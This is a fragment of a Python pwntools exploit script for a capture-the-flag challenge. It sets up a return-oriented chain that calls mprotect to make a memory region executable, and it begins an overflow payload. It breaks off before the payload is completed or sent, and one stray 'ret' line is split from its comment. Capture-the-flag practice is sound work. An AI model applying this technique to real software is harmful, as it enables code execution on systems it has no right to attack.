from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28185)
elf = ELF('./pwn')
mprotect = elf.sym['mprotect']
read_addr = elf.sym['read']
pop_ebx_esi_ebp_ret = 0x80a019b  #0x080a019b : pop ebx ; pop esi ; pop ebp ; 
ret
M_addr = 0x80DA000
M_size = 0x1000
M_proc = 0x7
payload = cyclic(0x12+4) + p32(mprotect)
